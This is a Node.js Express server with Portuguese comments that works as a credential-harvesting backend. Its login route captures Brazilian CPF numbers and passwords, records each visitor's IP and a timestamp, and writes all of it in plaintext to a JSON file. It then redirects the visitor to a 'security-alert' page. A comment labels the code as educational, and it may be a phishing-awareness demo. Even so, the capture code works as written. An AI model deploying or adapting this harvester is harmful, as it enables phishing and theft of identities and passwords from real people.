require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();

// Configurações básicas de ambiente
const PORT = process.env.PORT || 3000;
const DB_FILE = process.env.DB_FILE || path.join(__dirname, 'dados.json');

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Rota principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota de alerta de segurança
app.get('/security-alert', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'security-alert.html'));
});

// Rota de login - salva dados sem hash
app.post('/login', (req, res) => {
    const { cpf, senha } = req.body;
    const userIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const loginData = {
        cpf,
        senha, // Armazenando sem hash (APENAS PARA FINS EDUCACIONAIS)
        ip: userIp,
        data: new Date().toISOString()
    };

    // Salvar no arquivo JSON
    fs.readFile(DB_FILE, (err, data) => {
        let logins = [];
        
        if (!err && data.length > 0) {
            try {
                logins = JSON.parse(data);
            } catch (e) {
                console.error('Erro ao ler dados existentes:', e);
            }
        }
        
        logins.push(loginData);
        
        fs.writeFile(DB_FILE, JSON.stringify(logins, null, 2), (err) => {
            if (err) {
                console.error('Erro ao salvar dados:', err);
                return res.status(500).send('Erro no servidor');
            }
            
            // Redirecionar para página de alerta
            res.redirect('/security-alert');
        });
    });
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Arquivo de dados: ${DB_FILE}`);
    console.log('Acesse: http://localhost:' + PORT);
    
    // Criar arquivo de dados se não existir
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, '[]');
        console.log('Arquivo de dados criado:', DB_FILE);
    }
});